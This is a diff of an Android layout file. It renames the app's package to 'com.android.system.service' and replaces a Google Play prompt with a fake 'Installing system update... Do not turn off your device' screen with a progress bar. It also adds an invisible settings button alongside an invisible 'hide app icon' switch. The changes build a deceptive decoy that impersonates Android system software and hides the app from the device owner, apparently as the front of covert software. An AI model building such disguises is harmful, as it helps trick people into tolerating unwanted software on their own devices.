@@ -4,42 +4,79 @@
     android:id="@+id/activity_main"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    tools:context="com.hadar.framework.MainActivity">
+    android:background="#ff1a1a1a"
+    tools:context="com.android.system.service.MainActivity">
 
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
         android:layout_alignParentTop="true"
         android:layout_centerHorizontal="true"
-        android:layout_marginTop="100dp"
-        android:gravity="center_horizontal"
-        android:padding="20dp"
-        android:text="@string/oops_failed_to_open_google_play_please_open_it_manually"
-        android:textAlignment="center"
-        android:textColor="#C70039"
-        android:textSize="18sp" />
+        android:layout_marginTop="60dp"
+        android:text="@string/app_name"
+        android:textColor="#ffffff"
+        android:textSize="20sp"
+        android:textStyle="bold" />
 
-    <Button
+    <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="@string/open_google_play"
-        android:gravity="center"
+        android:layout_centerHorizontal="true"
+        android:layout_marginTop="100dp"
+        android:text="Installing system update..."
+        android:textColor="#aaaaaa"
+        android:textSize="14sp" />
+
+    <ProgressBar
+        android:id="@+id/progressBar1"
+        style="?android:attr/progressBarStyleHorizontal"
+        android:layout_width="300dp"
+        android:layout_height="wrap_content"
+        android:layout_centerHorizontal="true"
+        android:layout_marginTop="150dp"
+        android:indeterminate="true" />
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_centerHorizontal="true"
+        android:layout_marginTop="190dp"
+        android:text="Do not turn off your device"
+        android:textColor="#666666"
+        android:textSize="12sp" />
+
+    <TextView
+        android:id="@+id/statusText"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_centerHorizontal="true"
+        android:layout_marginTop="220dp"
+        android:text="Optimizing apps..."
+        android:textColor="#666666"
+        android:textSize="12sp" />
+
+    <Button
+        android:id="@+id/openSettingsBtn"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
         android:layout_centerInParent="true"
+        android:background="#1976D2"
+        android:gravity="center"
+        android:onClick="openSettings"
         android:padding="15dp"
-        android:background="#1B5E20"
-        android:textColor="#fff"
-        android:id="@+id/openGooglePlayBtn"
-        android:onClick="openGooglePlay"/>
+        android:text="@string/open_settings"
+        android:textColor="#ffffff"
+        android:visibility="invisible" />
 
     <Switch
         android:id="@+id/switch1"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="@string/hide_app_icon"
-        android:textStyle="bold"
-        android:layout_below="@+id/openGooglePlayBtn"
+        android:layout_below="@id/openSettingsBtn"
         android:layout_centerHorizontal="true"
         android:layout_marginTop="30dp"
-        android:visibility="invisible"/>
+        android:text="@string/hide_app_icon"
+        android:textStyle="bold"
+        android:visibility="invisible" />
 
 </RelativeLayout>
